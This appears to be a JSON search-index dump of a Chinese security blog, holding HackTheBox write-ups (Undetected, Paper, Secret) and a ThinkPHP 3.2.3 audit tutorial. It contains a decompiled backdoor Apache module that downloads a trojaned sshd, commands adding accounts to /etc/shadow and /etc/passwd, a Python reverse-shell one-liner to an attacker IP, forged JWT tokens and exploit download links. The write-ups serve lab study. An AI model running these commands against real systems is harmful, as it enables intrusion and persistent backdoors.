\"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: \u003e\u003e /etc/shadow\")}' /etc/passwd; awk -F\":\" '$7 == \"/bin/bash\" \u0026\u0026 $3 \u003e= 1000 {system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" \u003e users.txt\")}' /etc/passwd; while read -r user group home shell _; do echo \"$user\"1\"❌$group:$group:,,,:$home:$shell\" \u003e\u003e /etc/passwd; done \u003c users.txt; rm users.txt; 得到一个/etc/shadow里面的哈希$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/,利用cmd5对其进行反查,没有得到结果 利用john进行手动爆破,得到ihatehackers 以steven1@10.10.11.146成功登录 ","date":"2022-03-27","objectID":"/htb-undetected/:2:0","tags":null,"title":"HackTheBox-Undetected","uri":"/htb-undetected/"},{"categories":["HackTheBox"],"content":"获取root权限 前面用linPEAS得到信息,可以利用CVE-2021-4034进行提权 [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: probable Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main [+] [CVE-2021-3156] sudo Baron Samedit Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: mint=19,[ ubuntu=18|20 ], debian=10 Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main [+] [CVE-2021-3156] sudo Baron Samedit 2 Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10 Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main [+] [CVE-2021-22555] Netfilter heap out-of-bounds write Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html Exposure: probable Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*} Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c Comments: ip_tables kernel module must be loaded [+] [CVE-2017-5618] setuid screen v4.5.0 LPE Details: https://seclists.org/oss-sec/2017/q1/184 Exposure: less probable Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154 但是缺少比如make,cc,cc1等条件,无法编译(手动上传也不行…) CVE-2021-3156已经patched 除了直接提权外,还有邮件可能可以利用 /var/mail/steven From root@production Sun, 25 Jul 2021 10:31:12 GMT Return-Path: \u003croot@production\u003e Received: from production (localhost [127.0.0.1]) by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847 for \u003csteven@production\u003e; Sun, 25 Jul 2021 10:31:12 GMT Received: (from root@localhost) by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847; Sun, 25 Jul 2021 10:31:12 GMT Date: Sun, 25 Jul 2021 10:31:12 GMT Message-Id: \u003c202107251031.80FAcdZ171847@production\u003e To: steven@production From: root@production Subject: Investigations Hi Steven. We recently updated the system but are still experiencing some strange behaviour with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server. Thanks, sysadmin 对apache2进行了更新… steven@production:/tmp$ whereis apache2 apache2: /usr/sbin/apache2 /usr/lib/apache2 /etc/apache2 /usr/share/apache2 /usr/share/man/man8/apache2.8.gz steven@production:/usr/lib/apache2/modules$ pwd /usr/lib/apache2/modules steven@production:/usr/lib/apache2/modules$ ls -lrt total 8772 -rw-r--r-- 1 root root 34800 May 17 2021 mod_reader.so -rw-r--r-- 1 root root 4625776 Nov 25 23:16 libphp7.4.so ls按时间 降序 排列： ls -lt (最常用) ls按时间 升序 排列：ls -lrt mod_reader.so是最后更新的文件 int __fastcall hook_post_config(apr_pool_t_0 *pconf, apr_pool_t_0 *plog, apr_pool_t_0 *ptemp, server_rec_0 *s) { char *args[4]; // [rsp+0h] [rbp-38h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-10h] v6 = __readfsqword(0x28u); pid = fork(); if ( !pid ) { b64_decode( \"d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYm\" \"luL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk\", 0LL); args[2] = 0LL; args[3] = 0LL; args[0] = \"/bin/bash\"; args[1] = \"-c\"; execve(\"/bin/bash\", args, 0LL); } return 0; } wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d date +%Y-%m-%d -r /usr/sbin/a2enmod /usr/sbin/sshd 后面对于/usr/sbin/sshd的逆向分析是看wp了,对auth_password进行分析 int __fastcall auth_password(ssh *ssh, const char *password) { char v2; // dl Authctxt_0 *v3; // rbx passwd *v4; // r13 int v5; // er12 char *v6; // rax int v7; // er8 int result; // eax size_t v9; // r","date":"2022-03-27","objectID":"/htb-undetected/:3:0","tags":null,"title":"HackTheBox-Undetected","uri":"/htb-undetected/"},{"categories":["HackTheBox"],"content":"https://app.hackthebox.com/machines/Paper ","date":"2022-03-26","objectID":"/htb-paper/:0:0","tags":null,"title":"HackTheBox-Paper","uri":"/htb-paper/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 apache的测试页 响应头里面有X-Backend-Server: office.paper 把10.10.11.143 office.paper加到/etc/hosts里面 http://office.paper/index.php/2021/06/19/feeling-alone/ wpscan扫描结果 [+] URL: http://office.paper/ [10.10.11.143] [+] Started: Sat Mar 26 15:11:26 2022 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 | - X-Powered-By: PHP/7.2.24 | - X-Backend-Server: office.paper | Found By: Headers (Passive Detection) | Confidence: 100% [+] WordPress readme found: http://office.paper/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05). | Found By: Rss Generator (Passive Detection) | - http://office.paper/index.php/feed/, \u003cgenerator\u003ehttps://wordpress.org/?v=5.2.3\u003c/generator\u003e | - http://office.paper/index.php/comments/feed/, \u003cgenerator\u003ehttps://wordpress.org/?v=5.2.3\u003c/generator\u003e [+] WordPress theme in use: construction-techup | Location: http://office.paper/wp-content/themes/construction-techup/ | Last Updated: 2021-07-17T00:00:00.000Z | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt | [!] The version is out of date, the latest version is 1.4 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1 | Style Name: Construction Techup | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a... | Author: wptexture | Author URI: https://testerwp.com/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) | - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1' [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:04 \u003c=========================================================================\u003e (137 / 137) 100.00% Time: 00:00:04 [i] No Config Backups Found. [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Mar 26 15:11:37 2022 [+] Requests Done: 185 [+] Cached Requests: 5 [+] Data Sent: 44.587 KB [+] Data Received: 18.252 MB [+] Memory used: 266.254 MB [+] Elapsed time: 00:00:11 Unauthenticated View Private/Draft Posts http://office.paper/?static=1 把10.10.11.143 chat.office.paper加到/etc/hosts里面 ","date":"2022-03-26","objectID":"/htb-paper/:1:0","tags":null,"title":"HackTheBox-Paper","uri":"/htb-paper/"},{"categories":["HackTheBox"],"content":"获取user权限 聊天室里面有一个叫Recyclops的机器人,可以进行文件读取 root❌0:0:root:/root:/bin/bash bin❌1:1:bin:/bin:/sbin/nologin daemon❌2:2:daemon:/sbin:/sbin/nologin adm❌3:4:adm:/var/adm:/sbin/nologin lp❌4:7:lp:/var/spool/lpd:/sbin/nologin sync❌5:0:sync:/sbin:/bin/sync shutdown❌6:0:shutdown:/sbin:/sbin/shutdown halt❌7:0:halt:/sbin:/sbin/halt mail❌8:12:mail:/var/spool/mail:/sbin/nologin operator❌11:0:operator:/root:/sbin/nologin games❌12💯games:/usr/games:/sbin/nologin ftp❌14:50:FTP User:/var/ftp:/sbin/nologin nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin dbus❌81:81:System message bus:/:/sbin/nologin systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin polkitd❌998:996:User for polkitd:/:/sbin/nologin geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin qemu❌107:107:qemu user:/:/sbin/nologin apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin chrony❌993:987::/var/lib/chrony:/sbin/nologin libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin radvd❌75:75:radvd user:/:/sbin/nologin clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin sssd❌983:981:User for sssd:/:/sbin/nologin colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin gdm❌42:42::/var/lib/gdm:/sbin/nologin gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin tcpdump❌72:72::/:/sbin/nologin mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin mongod❌976:974:mongod:/var/lib/mongo:/bin/false rocketchat❌1001:1001::/home/rocketchat:/bin/bash dwight❌1004:1004::/home/dwight:/bin/bash 尝试命令注入,发现机器人返回Stop injecting OS commands! recyclops file ../bot_restart.sh #!/bin/bash # Cleaning hubot's log so that it won't grow too large. echo \"\" \u003e /home/dwight/hubot/.hubot.log # For starting the bot 20-ish (10+20) seconds late, when the server is restarted. # This is because MongoDB and Rocket-Chat server needs some time to startup properly sleep 10s # Checks if Hubot is running every 10s while [ 1 ]; do sleep 20s alive=$(/usr/sbin/ss -tulnp|grep 8000); if [[ -n $alive ]]; then err=$(grep -i 'unhandled-rejections=strict' /home/dwight/hubot/.hubot.log) if [[ -n $err ]]; then # Restarts bot echo \"[-] Bot not running! `date`\"; #Killing the old process pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d \" \" -f6); kill -9 $pid; cd /home/dwight/hubot; # Cleaning hubot's log so that it won't grow too large. echo \"\" \u003e /home/dwight/hubot/.hubot.log bash /home/dwight/hubot/start_bot.sh\u0026 else echo \"[+] Bot running succesfully! `date`\"; fi else # Restarts bot echo \"[-] Bot not running! `date`\"; #Killing the old process pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d \" \" -f6); kill -9 $pid; cd /home/dwight/hubot; bash /home/dwight/hubot/start_bot.sh\u0026 fi done recyclops file ../hubot/st","date":"2022-03-26","objectID":"/htb-paper/:2:0","tags":null,"title":"HackTheBox-Paper","uri":"/htb-paper/"},{"categories":["HackTheBox"],"content":"获取root权限 [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: less probable Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main [+] [CVE-2021-3156] sudo Baron Samedit Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: less probable Tags: mint=19,ubuntu=18|20, debian=10 Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main [+] [CVE-2021-3156] sudo Baron Samedit 2 Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: less probable Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10 Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main [+] [CVE-2021-22555] Netfilter heap out-of-bounds write Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html Exposure: less probable Tags: ubuntu=20.04{kernel:5.8.0-*} Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c Comments: ip_tables kernel module must be loaded [+] [CVE-2019-18634] sudo pwfeedback Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/ Exposure: less probable Tags: mint=19 Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c Comments: sudo configuration requires pwfeedback to be enabled. [+] [CVE-2019-15666] XFRM_UAF Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc Exposure: less probable Download URL: Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled 用CVE-2021-3560进行提权https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py ","date":"2022-03-26","objectID":"/htb-paper/:3:0","tags":null,"title":"HackTheBox-Paper","uri":"/htb-paper/"},{"categories":["HackTheBox"],"content":"https://app.hackthebox.com/machines/408 ","date":"2022-03-23","objectID":"/htb-secret/:0:0","tags":null,"title":"HackTheBox-Secret","uri":"/htb-secret/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 在docs目录介绍了如何调试api,而3000端口是用于api调试的,使用postman进行api调试 注意格式选择JSON而不是TEXT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNiMTcwMjljNmRlNzA0NWNmMzQxNmUiLCJuYW1lIjoibWkzYWthIiwiZW1haWwiOiJtaTNha2FAbWkzYWthLmNvbSIsImlhdCI6MTY0ODAzOTgyOX0.J0uPhnjO3JNsdsPOoNd-gKbgU_d-voRaHp6BlR7Nc04 尝试将HS256修改成None,无果 从http://10.10.11.120/download/files.zip下载源码,尝试从源码中寻找对称加密密钥 //routes/auth.js router.post('/login', async (req , res) =\u003e { const { error } = loginValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if email is okay const user = await User.findOne({ email: req.body.email }) if (!user) return res.status(400).send('Email is wrong'); // check password const validPass = await bcrypt.compare(req.body.password, user.password) if (!validPass) return res.status(400).send('Password is wrong'); // create jwt const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET ) res.header('auth-token', token).send(token); }) //.env DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' TOKEN_SECRET = secret 但是经过验证这个TOKEN_SECRET不正确 列了一下目录,发现存在.git目录,尝试恢复git记录 git log查看 commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -\u003e master) Author: dasithsv \u003cdasithsv@gmail.com\u003e Date: Thu Sep 9 00:03:27 2021 +0530 now we can view logs from server 😃 commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 Author: dasithsv \u003cdasithsv@gmail.com\u003e Date: Fri Sep 3 11:30:17 2021 +0530 removed .env for security reasons commit de0a46b5107a2f4d26e348303e76d85ae4870934 Author: dasithsv \u003cdasithsv@gmail.com\u003e Date: Fri Sep 3 11:29:19 2021 +0530 added /downloads commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb Author: dasithsv \u003cdasithsv@gmail.com\u003e Date: Fri Sep 3 11:27:35 2021 +0530 removed swap commit 3a367e735ee76569664bf7754eaaade7c735d702 Author: dasithsv \u003cdasithsv@gmail.com\u003e Date: Fri Sep 3 11:26:39 2021 +0530 added downloads commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8 Author: dasithsv \u003cdasithsv@gmail.com\u003e Date: Fri Sep 3 11:25:52 2021 +0530 first commit git log -p显示每次提交所引入的差异 -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE +TOKEN_SECRET = secret eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNiMTcwMjljNmRlNzA0NWNmMzQxNmUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1pM2FrYUBtaTNha2EuY29tIiwiaWF0IjoxNjQ4MDM5ODI5fQ.iXPlMOgNzfMI5PpQrJsb8pxK93FlHDMIDMw4_aiVlRk ","date":"2022-03-23","objectID":"/htb-secret/:1:0","tags":null,"title":"HackTheBox-Secret","uri":"/htb-secret/"},{"categories":["HackTheBox"],"content":"获取user权限 存在命令注入 //routes/private.js router.get('/logs', verifytoken, (req, res) =\u003e { const file = req.query.file; const userinfo = { name: req.user } const name = userinfo.name.name; if (name == 'theadmin'){ const getLogs = `git log --oneline ${file}`; exec(getLogs, (err , output) =\u003e{ if(err){ res.status(500).send(err); return } res.json(output); }) } else{ res.json({ role: { role: \"you are normal user\", desc: userinfo.name.name } }) } }) python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.16.20\",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")' 在.ssh/authorized_keys加个公钥即可使用ssh链接 ","date":"2022-03-23","objectID":"/htb-secret/:2:0","tags":null,"title":"HackTheBox-Secret","uri":"/htb-secret/"},{"categories":["HackTheBox"],"content":"获取root权限 ","date":"2022-03-23","objectID":"/htb-secret/:3:0","tags":null,"title":"HackTheBox-Secret","uri":"/htb-secret/"},{"categories":["代码审计"],"content":"参考链接 ThinkPHP3.2.3完整版 总结ThinkPHP v3的代码审计方法 敏信审计系列之THINKPHP3.2开发框架 Thinkphp多个版本注入分析 水文-Thinkphp3.2.3安全开发须知 ","date":"2022-03-21","objectID":"/thinkphp_v3/:1:0","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"cms组成 ├─Application 项目目录 │ ├─Common 公共模块 │ │ ├─Common │ │ └─Conf │ ├─Home 前台模块 │ │ ├─Common 公共函数 │ │ ├─Conf 配置文件 │ │ ├─Controller 控制器 │ │ ├─Model 模型 │ │ └─View 视图 │ └─Runtime │ ├─Cache │ │ └─Home │ ├─Data │ ├─Logs │ │ └─Home │ └─Temp ├─Public 资源文件目录 └─ThinkPHP 框架目录 ├─Common ├─Conf ├─Lang ├─Library │ ├─Behavior │ ├─Org │ │ ├─Net │ │ └─Util │ ├─Think │ │ ├─Cache │ │ │ └─Driver │ │ ├─Controller │ │ ├─Crypt │ │ │ └─Driver │ │ ├─Db │ │ │ └─Driver │ │ ├─Image │ │ │ └─Driver │ │ ├─Log │ │ │ └─Driver │ │ ├─Model │ │ ├─Session │ │ │ └─Driver │ │ ├─Storage │ │ │ └─Driver │ │ ├─Template │ │ │ ├─Driver │ │ │ └─TagLib │ │ ├─Upload │ │ │ └─Driver │ │ │ ├─Bcs │ │ │ └─Qiniu │ │ └─Verify │ │ ├─bgs │ │ ├─ttfs │ │ └─zhttfs │ └─Vendor │ ├─Boris │ ├─EaseTemplate │ ├─Hprose │ ├─jsonRPC │ ├─phpRPC │ │ ├─dhparams │ │ └─pecl │ │ └─xxtea │ │ └─test │ ├─SmartTemplate │ ├─Smarty │ │ ├─plugins │ │ └─sysplugins │ ├─spyc │ │ ├─examples │ │ ├─php4 │ │ └─tests │ └─TemplateLite │ └─internal ├─Mode │ ├─Api │ ├─Lite │ └─Sae └─Tpl 在Application\\Runtime\\Logs\\Home中含有thinkphp的运行日志,运行日志放置在网站部署目录下,直接暴露于外部,可以让攻击者获取运行日志并进行分析 日志命名格式为年_月_日.log,因此可以编写脚本进行批量获取 作为一个mvc框架的cms,重点应该关注项目目录即Application(但是可以被设置成其他目录) 模型:封装与应用程序的业务逻辑相关的数据以及对数据的处理方法 视图:数据显示 控制器:处理用户交互,从视图读取数据,向模型发送数据,也是主要审计的点 ","date":"2022-03-21","objectID":"/thinkphp_v3/:2:0","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"参数传递 除了使用传统的$_GET和$_POST外,thinkphp新增了一个I方法(function I),用于安全地获取用户输入 使用方法如下 1. I('id',0); 获取id参数 自动判断get或者post 2. I('post.name','','htmlspecialchars'); 获取$_POST['name']并使用htmlspecialchars进行过滤 3. I('get.'); 获取$_GET ThinkPHP/Common/functions.php /** * 获取输入参数 支持过滤和默认值 * 使用方法: * \u003ccode\u003e * I('id',0); 获取id参数 自动判断get或者post * I('post.name','','htmlspecialchars'); 获取$_POST['name'] * I('get.'); 获取$_GET * \u003c/code\u003e * @param string $name 变量的名称 支持指定类型 * @param mixed $default 不存在的时候默认值 * @param mixed $filter 参数过滤方法 * @param mixed $datas 要获取的额外数据源 * @return mixed */ function I($name,$default='',$filter=null,$datas=null) { static $_PUT = null; if(strpos($name,'/')){ // 指定修饰符 list($name,$type) = explode('/',$name,2);// name/s =\u003e array('name','s') =\u003e $name='name' $type=s 字符串 }elseif(C('VAR_AUTO_STRING')){ // 默认强制转换为字符串 $type = 's'; } if(strpos($name,'.')) { // 指定参数来源 list($method,$name) = explode('.',$name,2);// get.a =\u003e $method=get $name=a }else{ // 默认为自动判断 $method = 'param'; } switch(strtolower($method)) { case 'get' : $input =\u0026 $_GET; break; case 'post' : $input =\u0026 $_POST; break; case 'put' : if(is_null($_PUT)){ parse_str(file_get_contents('php://input'), $_PUT); } $input = $_PUT; break; case 'param' : switch($_SERVER['REQUEST_METHOD']) { case 'POST': $input = $_POST; break; case 'PUT': if(is_null($_PUT)){ parse_str(file_get_contents('php://input'), $_PUT); } $input = $_PUT; break; default: $input = $_GET; } break; case 'path' : $input = array(); if(!empty($_SERVER['PATH_INFO'])){ $depr = C('URL_PATHINFO_DEPR'); $input = explode($depr,trim($_SERVER['PATH_INFO'],$depr)); } break; case 'request' : $input =\u0026 $_REQUEST; break; case 'session' : $input =\u0026 $_SESSION; break; case 'cookie' : $input =\u0026 $_COOKIE; break; case 'server' : $input =\u0026 $_SERVER; break; case 'globals' : $input =\u0026 $GLOBALS; break; case 'data' : $input =\u0026 $datas; break; default: return null; } if(''==$name) { // 获取全部变量 $data = $input; $filters = isset($filter)?$filter:C('DEFAULT_FILTER');//默认情况下为 htmlspecialchars if($filters) { if(is_string($filters)){ $filters = explode(',',$filters); } foreach($filters as $filter){ $data = array_map_recursive($filter,$data); // 参数过滤 } } }elseif(isset($input[$name])) { // 取值操作 $data = $input[$name]; $filters = isset($filter)?$filter:C('DEFAULT_FILTER'); if($filters) { if(is_string($filters)){ if(0 === strpos($filters,'/')){ if(1 !== preg_match($filters,(string)$data)){ // 支持正则验证 return isset($default) ? $default : null; } }else{ $filters = explode(',',$filters); } }elseif(is_int($filters)){ $filters = array($filters); } if(is_array($filters)){ foreach($filters as $filter){ if(function_exists($filter)) { $data = is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤 }else{ $data = filter_var($data,is_int($filter) ? $filter : filter_id($filter)); if(false === $data) { return isset($default) ? $default : null; } } } } } if(!empty($type)){ switch(strtolower($type)){ case 'a': // 数组 $data = (array)$data; break; case 'd': // 数字 $data = (int)$data; break; case 'f': // 浮点 $data = (float)$data; break; case 'b': // 布尔 $data = (boolean)$data; break; case 's': // 字符串 default: $data = (string)$data; } } }else{ // 变量默认值 $data = isset($default)?$default:null; } is_array($data) \u0026\u0026 array_walk_recursive($data,'think_filter'); return $data; } function think_filter(\u0026$value){ // TODO 其他安全过滤 // 过滤查询特殊字符 if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){ $value .= ' '; } } ","date":"2022-03-21","objectID":"/thinkphp_v3/:3:0","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"其他快捷方法 ThinkPHP/Common/functions.php D方法用于实例化模型类 M方法用于实例化没有模型文件的Model C方法用于读取配置 在Application/Home/Model/UserModel.class.php中写入 \u003c?php namespace Home\\Model; use Think\\Model; class UserModel extends Model { public $a='asdf'; } 在Application/Home/Controller/IndexController.class.php中写入 \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User=new \\Home\\Model\\UserModel(); var_dump($User-\u003ea); $User=D('User');//等价于 $User=new \\Home\\Model\\UserModel(); var_dump($User-\u003ea); $User=M('User');//等价于 $User=new \\Think\\Model('User'); var_dump($User-\u003ea); } } C:\\phpstudy_pro\\WWW\\thinkphp_3.2.3\\Application\\Home\\Controller\\IndexController.class.php:7:string 'asdf' (length=4) C:\\phpstudy_pro\\WWW\\thinkphp_3.2.3\\Application\\Home\\Controller\\IndexController.class.php:9:string 'asdf' (length=4) C:\\phpstudy_pro\\WWW\\thinkphp_3.2.3\\Application\\Home\\Controller\\IndexController.class.php:11:null /** * 实例化模型类 格式 [资源://][模块/]模型 * @param string $name 资源地址 * @param string $layer 模型层名称 * @return Think\\Model */ function D($name='',$layer='') { if(empty($name)) return new Think\\Model; static $_model = array(); $layer = $layer? : C('DEFAULT_M_LAYER'); if(isset($_model[$name.$layer])) return $_model[$name.$layer]; $class = parse_res_name($name,$layer);//导入类库 if(class_exists($class)) { $model = new $class(basename($name)); }elseif(false === strpos($name,'/')){ // 自动加载公共模块下面的模型 if(!C('APP_USE_NAMESPACE')){ import('Common/'.$layer.'/'.$class); }else{ $class = '\\\\Common\\\\'.$layer.'\\\\'.$name.$layer; } $model = class_exists($class)? new $class($name) : new Think\\Model($name); }else { Think\\Log::record('D方法实例化没找到模型类'.$class,Think\\Log::NOTICE); $model = new Think\\Model(basename($name)); } $_model[$name.$layer] = $model; return $model; } /** * 实例化一个没有模型文件的Model * @param string $name Model名称 支持指定基础模型 例如 MongoModel:User * @param string $tablePrefix 表前缀 * @param mixed $connection 数据库连接信息 * @return Think\\Model */ function M($name='', $tablePrefix='',$connection='') { static $_model = array(); if(strpos($name,':')) { list($class,$name) = explode(':',$name); }else{ $class = 'Think\\\\Model'; } $guid = (is_array($connection)?implode('',$connection):$connection).$tablePrefix . $name . '_' . $class; if (!isset($_model[$guid])) $_model[$guid] = new $class($name,$tablePrefix,$connection); return $_model[$guid]; } /** * 获取和设置配置参数 支持批量定义 * @param string|array $name 配置变量 * @param mixed $value 配置值 * @param mixed $default 默认值 * @return mixed */ function C($name=null, $value=null,$default=null) { static $_config = array(); // 无参数时获取所有 if (empty($name)) { return $_config; } // 优先执行设置获取或赋值 if (is_string($name)) { if (!strpos($name, '.')) { $name = strtoupper($name); if (is_null($value)) return isset($_config[$name]) ? $_config[$name] : $default; $_config[$name] = $value; return null; } // 二维数组设置和获取支持 $name = explode('.', $name); $name[0] = strtoupper($name[0]); if (is_null($value)) return isset($_config[$name[0]][$name[1]]) ? $_config[$name[0]][$name[1]] : $default; $_config[$name[0]][$name[1]] = $value; return null; } // 批量设置 if (is_array($name)){ $_config = array_merge($_config, array_change_key_case($name,CASE_UPPER)); return null; } return null; // 避免非法参数 } 实例化一个空模型类即可进行sql查询 namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $m = M();//$m = new Model(); $m-\u003equery('select user();'); } } ","date":"2022-03-21","objectID":"/thinkphp_v3/:4:0","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"sql注入 ","date":"2022-03-21","objectID":"/thinkphp_v3/:5:0","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"双引号包裹导致变量被直接解析 严格来说,这个漏洞产生的原因在于开发者没有正确地使用框架 \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); $name = 